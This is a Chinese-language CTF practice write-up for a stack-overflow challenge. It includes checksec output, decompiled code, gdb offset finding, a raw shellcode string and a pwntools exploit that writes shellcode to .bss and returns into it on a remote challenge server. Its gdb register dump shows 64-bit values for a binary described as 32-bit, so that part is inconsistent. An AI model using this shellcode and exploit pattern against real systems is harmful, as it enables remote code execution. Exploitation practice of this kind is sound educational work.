# pwn练习

## 杂

### shellcode2

![](http://ww1.sinaimg.cn/large/006pWR9agy1g5mwwyhwxfj30ix0b3t97.jpg)

思路:找一个没有sh的shellcode

### simple_stackoverflow



- 常规检查

```shell
checksec simple_stackoverflow
#    Arch:     i386-32-little
#    RELRO:    Partial RELRO
#    Stack:    No canary found
#    NX:       NX disabled
#    PIE:      No PIE (0x8048000)
#    RWX:      Has RWX segments

```

啥保护都没开(开了我就凉了)

- 反汇编查看代码

  ```c
  int __cdecl main(int argc, const char **argv, const char **envp)
  {
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(_bss_start, 0);
    overflow();
    return 0;
  }
  int overflow()
  {
    char buf; // [esp+8h] [ebp-20h]
  
    read(0, &::buf, 0x3FFu);
    read(0, &buf, 0x3FFu);
    return 0;
  }
  ```

  发现`read(0, &buf, 0x3FFu);`可以通过栈溢出覆盖返回地址

   ` read(0, &::buf, 0x3FFu);`可以向bss中写入shellcode

```shell
#gdb simple_stackoverflow
 gdb-peda$  pattern create 128
输入'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA'

 ─────────────────────────────────[ REGISTERS ]─────────────────────────────────────
 RBP  0x4147414131414162 ('bAA1AAGA')
 RSP  0x7fffffffe4e8 ◂— 'AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA\n'
 RIP  0x400750 (main+138) ◂— ret 
 gdb-peda$ pattern offset AcAA2AAH
36
```

相差36个字节

找到合适的shellcode

```shell
shellcode="\x31\xc0\x0f\xa2\x51\x68\xe7\x95\xa8\xec\x68\xde\x7f\x37\x3f\x68\x07\x1a\xec\x8f\x68\x6e\x1c\x4a\x0e\x68\x06\x5b\x16\x04\x31\x0c\x24\x5a\x75\xfa\x83\xec\x18\x54\xc3"
```

最后的exp:

```python

from pwn import *
conn=remote('120.79.114.39',10003)
shellcode="\x31\xc0\x0f\xa2\x51\x68\xe7\x95\xa8\xec\x68\xde\x7f\x37\x3f\x68\x07\x1a\xec\x8f\x68\x6e\x1c\x4a\x0e\x68\x06\x5b\x16\x04\x31\x0c\x24\x5a\x75\xfa\x83\xec\x18\x54\xc3"
payload='aaaa'*9+p32(0x0804A060)
time.sleep(1)
conn.send(shellcode)
conn.send(payload)
conn.interactive()

```



